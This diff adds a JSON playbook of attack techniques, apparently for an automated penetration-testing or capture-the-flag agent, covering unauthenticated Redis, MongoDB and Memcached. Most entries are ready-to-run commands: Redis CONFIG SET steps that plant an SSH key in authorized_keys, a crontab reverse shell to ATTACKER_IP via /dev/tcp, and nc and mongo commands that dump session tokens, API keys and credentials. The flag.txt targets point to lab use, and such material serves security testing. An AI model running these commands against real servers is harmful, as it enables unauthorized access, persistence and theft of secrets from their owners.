@@ -1,0 +1,78 @@
+[
+  {
+    "id": "redis-unauth-exploit",
+    "title": "Redis Unauthorized Access — SSH Key / Crontab Exploitation",
+    "category": "AUTH",
+    "subcategory": "Database",
+    "description": "When Redis is accessible without authentication (AuthBypass), an attacker can abuse the CONFIG SET command to write arbitrary files to disk. Two common techniques: (1) Write an SSH public key to ~/.ssh/authorized_keys for passwordless SSH access. (2) Write a reverse shell to /etc/crontab or /var/spool/cron/crontabs/. The write path depends on the Redis server's filesystem permissions and the target user's home directory.",
+    "techniques": [
+      "redis-cli -h TARGET -p PORT CONFIG SET dir /home/victim/.ssh/",
+      "redis-cli -h TARGET -p PORT CONFIG SET dbfilename authorized_keys",
+      "redis-cli -h TARGET -p PORT SET key '\\n\\nssh-rsa AAA...\\n\\n'",
+      "redis-cli -h TARGET -p PORT CONFIG SET dir /var/spool/cron/crontabs/",
+      "redis-cli -h TARGET -p PORT CONFIG SET dbfilename root",
+      "redis-cli -h TARGET -p PORT SET key '\\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\\n'",
+      "ssh -i /tmp/redis_key victim@TARGET 'cat /flag.txt'",
+      "redis-cli -h TARGET -p PORT SAVE",
+      "First test connection: redis-cli -h TARGET -p PORT PING",
+      "Check current config: redis-cli -h TARGET -p PORT CONFIG GET dir",
+      "Also try reading files via GET if keys contain sensitive data: redis-cli -h TARGET -p PORT KEYS '*' then GET each key"
+    ],
+    "tools": ["redis_cmd", "ssh_exec", "ssh_key_exec"],
+    "tags": ["redis", "unauthorized", "ssh", "crontab", "lateral-movement", "AuthBypass"],
+    "confidence": 0.9,
+    "mitre_attack": "T1078"
+  },
+  {
+    "id": "redis-unauth-ssh-keygen",
+    "title": "Redis Unauthorized → SSH Key Generation and Injection",
+    "category": "AUTH",
+    "subcategory": "Database",
+    "description": "Step-by-step Redis AuthBypass → SSH: (0) Clean old keys: rm -f /tmp/redis_key /tmp/redis_key.pub (1) Generate SSH key pair: ssh-keygen -t rsa -f /tmp/redis_key -N '' -q (2) Read the public key: cat /tmp/redis_key.pub (3) Connect to Redis: redis-cli -h TARGET -p PORT (4) Flush existing data: FLUSHALL (5) Set the key with SSH public key wrapped in newlines: SET mykey '\\n\\n<PUBLIC_KEY_CONTENT>\\n\\n' (6) Set Redis working directory: CONFIG SET dir /home/victim/.ssh/ (7) Set DB filename: CONFIG SET dbfilename authorized_keys (8) Save to disk: SAVE (9) SSH in: ssh -i /tmp/redis_key victim@TARGET (10) Read flag: cat /flag.txt or cat /home/victim/flag.txt",
+    "techniques": [
+      "rm -f /tmp/redis_key /tmp/redis_key.pub",
+      "rm -f /tmp/redis_key /tmp/redis_key.pub && ssh-keygen -t rsa -f /tmp/redis_key -N '' -q",
+      "cat /tmp/redis_key.pub",
+      "redis-cli -h TARGET -p PORT FLUSHALL",
+      "redis-cli -h TARGET -p PORT SET mykey '\\n\\nssh-rsa AAAA...\\n\\n'",
+      "redis-cli -h TARGET -p PORT CONFIG SET dir /home/victim/.ssh/",
+      "redis-cli -h TARGET -p PORT CONFIG SET dbfilename authorized_keys",
+      "redis-cli -h TARGET -p PORT SAVE",
+      "ssh -i /tmp/redis_key victim@TARGET cat /flag.txt"
+    ],
+    "tools": ["redis_cmd", "shell_exec", "ssh_exec"],
+    "tags": ["redis", "unauthorized", "ssh", "key-generation", "AuthBypass"],
+    "confidence": 0.95,
+    "mitre_attack": "T1078"
+  },
+  {
+    "id": "mongodb-unauth-exploit",
+    "title": "MongoDB Unauthorized Access Exploitation",
+    "category": "AUTH",
+    "subcategory": "Database",
+    "description": "MongoDB without authentication allows reading all databases and collections. Use mongo shell to connect, list databases (show dbs), switch to each (use dbname), list collections (show collections), and dump data (db.collection.find()). Look for credentials, tokens, or flag values in document fields.",
+    "techniques": [
+      "mongo TARGET:PORT/admin --eval 'show dbs'",
+      "mongo TARGET:PORT/DATABASE --eval 'show collections'",
+      "mongo TARGET:PORT/DATABASE --eval 'db.COLLECTION.find().pretty()'"
+    ],
+    "tools": ["shell_exec"],
+    "tags": ["mongodb", "unauthorized", "database"],
+    "confidence": 0.85
+  },
+  {
+    "id": "memcached-unauth-exploit",
+    "title": "Memcached Unauthorized Access — Data Dump",
+    "category": "GENERAL",
+    "subcategory": "Database",
+    "description": "Memcached without authentication allows dumping all cached data including session tokens, API keys, and database credentials. Use telnet or nc to connect, run 'stats items' to list slabs, then 'stats cachedump SLAB_ID LIMIT' to dump keys and values.",
+    "techniques": [
+      "echo 'stats items' | nc TARGET PORT",
+      "echo 'stats cachedump SLAB_ID 100' | nc TARGET PORT",
+      "echo 'get KEY_NAME' | nc TARGET PORT"
+    ],
+    "tools": ["shell_exec"],
+    "tags": ["memcached", "unauthorized", "cache"],
+    "confidence": 0.85
+  }
+]
